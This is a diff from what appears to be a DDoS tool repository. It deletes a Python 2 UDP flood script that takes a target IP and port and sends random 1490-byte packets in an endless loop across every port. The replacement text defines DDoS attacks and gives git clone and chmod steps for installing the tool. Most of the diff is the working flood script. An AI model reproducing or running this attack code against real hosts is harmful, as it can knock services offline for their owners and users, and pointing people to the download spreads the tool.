@@ -1,48 +1,9 @@
-# Ddos-attack 51 lines (47 sloc) 1.13 KB
-import sys
-import os
-import time
-import socket
-import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+DDos-Attack
+What Is A DDos-Attack
+A Distributed Denial of Service (DDoS) attack is an attempt to make an online service unavailable
 
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
-
-os.system("clear")
-os.system("figlet DDos Attack")
-print
-print "Author   : Aghorii"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
-
-os.system("clear")
-os.system("figlet Attack Starting")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
-sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+by overwhelming it with traffic from multiple sources. They target a wide variety of important resources from banks to news websites, and present a major challenge to making sure people can publish and access important information
+Dwonload&Install
+git clone https://github.com/Ha3MrX/DDos-Attack
+cd DDos-Attack
+chmod +x ddos-attack.py
